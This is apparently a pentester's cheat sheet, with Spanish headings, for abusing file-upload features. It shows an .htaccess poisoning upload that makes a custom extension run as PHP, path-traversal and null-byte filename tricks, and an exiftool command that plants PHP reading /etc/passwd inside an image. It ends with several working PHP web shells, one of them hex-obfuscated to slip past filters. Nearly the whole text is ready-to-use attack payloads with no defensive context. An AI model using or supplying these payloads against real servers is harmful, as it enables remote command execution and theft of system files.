-- -
### htaccess posioning

 ```php
1. Content-Disposition: form-data; name="fileToUpload"; filename=".htaccess" 
    Content-Type: text/plain
    AddType application/x-httpd-php .test 
2. 
	Content-Disposition: form-data; name="fileToUpload"; filename="cmd.test" 
	Content-Type: application/x-php
	
	<?php
		system($_GET['cmd']);
	?>
```

### Otro tipo de metodos
```bash
1.
	../shell.php
2.
	%2e%2e%2fshell.php
3.
	shell.php%00.jpg
4.
	exiftool -comment="<?php echo 'LOOK HERE' . file_get_contents('/etc/passwd'); ?>" background.png
```

**Otro tipo de webshells en php:**
```php
<?=`$_GET[0]`?>

<?php
	$c=$_GET['cmd'];
	 echo `$c`;
?>

<?php
	"system"("id");
?>

<?php
	"\x73\x79\x73\x74\x65\x6d"($_GET['cmd']);
?>
```


